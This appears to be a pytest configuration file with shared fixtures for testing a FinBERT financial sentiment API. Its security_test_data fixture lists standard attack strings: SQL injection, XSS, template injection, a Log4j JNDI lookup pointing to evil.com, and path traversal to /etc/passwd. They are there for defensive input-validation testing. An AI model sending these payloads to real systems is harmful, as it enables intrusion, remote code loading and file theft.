"""
Pytest configuration and shared fixtures for FinBERT API tests.
"""
import asyncio
import os
import pytest
import redis.asyncio as redis
from httpx import AsyncClient
from unittest.mock import AsyncMock, MagicMock
from typing import AsyncGenerator, Generator, Dict, Any
import tempfile
import shutil
from pathlib import Path

# Set test environment variables
os.environ["ENVIRONMENT"] = "test"
os.environ["API_HOST"] = "127.0.0.1"
os.environ["API_PORT"] = "8001"  # Different port for tests
os.environ["LOG_LEVEL"] = "warning"
os.environ["REDIS_URL"] = "redis://localhost:6379/15"  # Test database
os.environ["MODEL_NAME"] = "ProsusAI/finbert"
os.environ["MAX_SEQUENCE_LENGTH"] = "512"
os.environ["BATCH_SIZE"] = "1"  # Smaller batch for tests
os.environ["TRANSFORMERS_CACHE"] = "/tmp/test_transformers_cache"
os.environ["HF_HOME"] = "/tmp/test_hf_cache"


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
async def redis_client():
    """Create a Redis client for testing."""
    client = redis.Redis.from_url(
        os.environ["REDIS_URL"],
        encoding="utf-8",
        decode_responses=True
    )
    
    # Test connection
    try:
        await client.ping()
    except Exception:
        pytest.skip("Redis not available for testing")
    
    yield client
    
    # Cleanup
    await client.flushdb()
    await client.close()


@pytest.fixture
async def clean_redis(redis_client):
    """Clean Redis database before each test."""
    await redis_client.flushdb()
    yield redis_client
    await redis_client.flushdb()


@pytest.fixture(scope="session")
def temp_cache_dir():
    """Create temporary cache directory for tests."""
    temp_dir = tempfile.mkdtemp(prefix="finbert_test_cache_")
    os.environ["TRANSFORMERS_CACHE"] = temp_dir
    os.environ["HF_HOME"] = temp_dir
    
    yield temp_dir
    
    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def mock_transformers():
    """Mock transformers model and tokenizer."""
    mock_tokenizer = MagicMock()
    mock_tokenizer.encode.return_value = [101, 2023, 2003, 1037, 3231, 102]  # Example token IDs
    mock_tokenizer.decode.return_value = "This is a test"
    mock_tokenizer.tokenize.return_value = ["this", "is", "a", "test"]
    mock_tokenizer.model_max_length = 512
    mock_tokenizer.return_value = {
        "input_ids": [[101, 2023, 2003, 1037, 3231, 102]],
        "attention_mask": [[1, 1, 1, 1, 1, 1]]
    }
    
    mock_model = MagicMock()
    mock_model.eval.return_value = mock_model
    mock_model.return_value = MagicMock(
        logits=MagicMock(detach=MagicMock(return_value=MagicMock(
            cpu=MagicMock(return_value=MagicMock(
                numpy=MagicMock(return_value=[[0.1, 0.7, 0.2]])  # [negative, neutral, positive]
            ))
        )))
    )
    
    return {
        "tokenizer": mock_tokenizer,
        "model": mock_model
    }


@pytest.fixture
def sample_financial_texts():
    """Sample financial texts for testing."""
    return {
        "positive": [
            "Apple Inc. reported record quarterly earnings, beating analyst expectations by 15%.",
            "Tesla stock surges 20% after announcing breakthrough in battery technology.",
            "Microsoft announces strong cloud revenue growth and raises guidance for next quarter."
        ],
        "negative": [
            "Company faces significant challenges due to supply chain disruptions.",
            "Quarterly losses exceed expectations, causing concern among investors.",
            "Regulatory investigation threatens future business operations and profitability."
        ],
        "neutral": [
            "The company will hold its annual shareholders meeting next month.",
            "Board of directors announces retirement of long-serving CEO.",
            "Company files routine regulatory documents with the SEC."
        ],
        "edge_cases": [
            "",  # Empty string
            "A",  # Single character
            "This is a very short text.",  # Short text
            " ".join(["Long"] * 200),  # Very long text
            "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?",  # Special characters
            "Émojis and ünïcödé characters: 📈 📉 💰",  # Unicode
            "Mixed language text: The company la empresa is doing bien good."  # Mixed language
        ]
    }


@pytest.fixture
def expected_sentiment_results():
    """Expected sentiment analysis results for test texts."""
    return {
        "positive_score_range": (0.6, 1.0),
        "negative_score_range": (0.0, 0.4),
        "neutral_score_range": (0.4, 0.6),
        "confidence_threshold": 0.7
    }


@pytest.fixture
def mock_api_responses():
    """Mock API responses for testing."""
    return {
        "sentiment_analysis": {
            "text": "Apple Inc. reported record quarterly earnings.",
            "sentiment": {
                "label": "positive",
                "score": 0.85,
                "confidence": 0.92
            },
            "processing_time": 0.234,
            "model_info": {
                "name": "ProsusAI/finbert",
                "version": "1.0.0"
            }
        },
        "batch_analysis": {
            "results": [
                {
                    "text": "Earnings beat expectations",
                    "sentiment": {"label": "positive", "score": 0.78, "confidence": 0.89}
                },
                {
                    "text": "Stock price declining",
                    "sentiment": {"label": "negative", "score": 0.23, "confidence": 0.85}
                }
            ],
            "processing_time": 0.456,
            "batch_size": 2
        },
        "health_check": {
            "status": "healthy",
            "timestamp": "2024-01-15T10:30:00Z",
            "version": "1.0.0",
            "model_loaded": True,
            "cache_status": "connected"
        },
        "error_responses": {
            "invalid_input": {
                "error": "Invalid input",
                "message": "Text input is required",
                "code": "INVALID_INPUT"
            },
            "model_error": {
                "error": "Model processing error",
                "message": "Failed to process text with model",
                "code": "MODEL_ERROR"
            },
            "rate_limit": {
                "error": "Rate limit exceeded",
                "message": "Too many requests",
                "code": "RATE_LIMIT_EXCEEDED"
            }
        }
    }


@pytest.fixture
async def test_client():
    """Create test client for API testing."""
    # Import here to avoid circular imports and ensure environment is set
    from src.main import app
    
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client


@pytest.fixture
def performance_benchmarks():
    """Performance benchmarks for testing."""
    return {
        "single_request": {
            "max_response_time": 0.5,  # 500ms
            "target_response_time": 0.2  # 200ms
        },
        "batch_request": {
            "max_response_time": 2.0,  # 2 seconds for batch of 10
            "target_response_time": 1.0  # 1 second target
        },
        "memory_usage": {
            "max_memory_mb": 2048,  # 2GB max
            "target_memory_mb": 1024  # 1GB target
        },
        "throughput": {
            "min_requests_per_second": 50,
            "target_requests_per_second": 100
        }
    }


@pytest.fixture
def security_test_data():
    """Security test data for vulnerability testing."""
    return {
        "injection_attempts": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
            "1' OR '1'='1",  # SQL injection
        ],
        "malformed_requests": [
            {"text": None},
            {"text": 123},
            {"text": []},
            {"wrong_field": "value"},
            {},  # Empty body
        ],
        "oversized_requests": [
            {"text": "A" * 10000},  # Very long text
            {"text": "A" * 100000},  # Extremely long text
        ],
        "invalid_headers": [
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/plain"},
            {"Authorization": "Bearer invalid_token"},
        ]
    }


@pytest.fixture
def load_test_config():
    """Configuration for load testing."""
    return {
        "users": 10,
        "spawn_rate": 2,
        "duration": "30s",
        "endpoints": [
            "/health",
            "/analyze",
            "/batch-analyze"
        ],
        "test_scenarios": [
            "normal_load",
            "spike_load",
            "stress_load",
            "endurance_load"
        ]
    }


@pytest.fixture(autouse=True)
def mock_model_loading(monkeypatch, mock_transformers):
    """Auto-mock model loading for all tests to avoid downloading models."""
    def mock_from_pretrained(*args, **kwargs):
        return mock_transformers["model"]
    
    def mock_tokenizer_from_pretrained(*args, **kwargs):
        return mock_transformers["tokenizer"]
    
    monkeypatch.setattr(
        "transformers.AutoModelForSequenceClassification.from_pretrained",
        mock_from_pretrained
    )
    monkeypatch.setattr(
        "transformers.AutoTokenizer.from_pretrained",
        mock_tokenizer_from_pretrained
    )


# Pytest markers for test organization
def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line("markers", "unit: Unit tests")
    config.addinivalue_line("markers", "integration: Integration tests")
    config.addinivalue_line("markers", "e2e: End-to-end tests")
    config.addinivalue_line("markers", "slow: Slow running tests")
    config.addinivalue_line("markers", "benchmark: Performance benchmark tests")
    config.addinivalue_line("markers", "security: Security-related tests")
    config.addinivalue_line("markers", "model: Machine learning model tests")
    config.addinivalue_line("markers", "api: API endpoint tests")
    config.addinivalue_line("markers", "cache: Cache-related tests")
    config.addinivalue_line("markers", "gpu: Tests requiring GPU")


def pytest_collection_modifyitems(config, items):
    """Modify test items to add markers based on file location."""
    for item in items:
        # Add markers based on test file location
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        
        # Add slow marker for tests that take longer
        if "load_test" in item.name or "benchmark" in item.name:
            item.add_marker(pytest.mark.slow)